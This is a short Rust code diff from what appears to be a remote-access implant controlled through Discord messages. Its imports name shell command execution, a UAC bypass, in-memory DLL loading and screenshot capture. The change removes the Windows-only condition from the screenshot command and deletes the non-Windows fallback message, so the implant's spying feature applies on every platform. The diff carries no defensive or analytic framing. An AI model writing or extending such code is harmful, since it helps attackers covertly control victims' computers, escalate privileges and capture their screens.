@@ -11,7 +11,6 @@ use reqwest::blocking::multipart::{Form, Part};
 use reqwest::blocking::Client;
 use reqwest::StatusCode;
 
-#[cfg(windows)]
 use crate::commands::capture_screenshot;
 use crate::commands::{
     execute_kill, execute_shell_command, execute_uac_bypass, get_help_message, load_dll_from_bytes,
@@ -386,15 +385,9 @@ impl DiscordClient {
                 self.send_command_result(channel_id, result)?;
                 Ok(true)
             }
-            #[cfg(windows)]
             Command::Screenshot => {
                 let result = capture_screenshot();
                 self.send_command_result(channel_id, result)?;
-                Ok(true)
-            }
-            #[cfg(not(windows))]
-            Command::Screenshot => {
-                self.send_message(channel_id, "Screenshot is only supported on Windows")?;
                 Ok(true)
             }
             Command::LoadDll(dll_name) => {
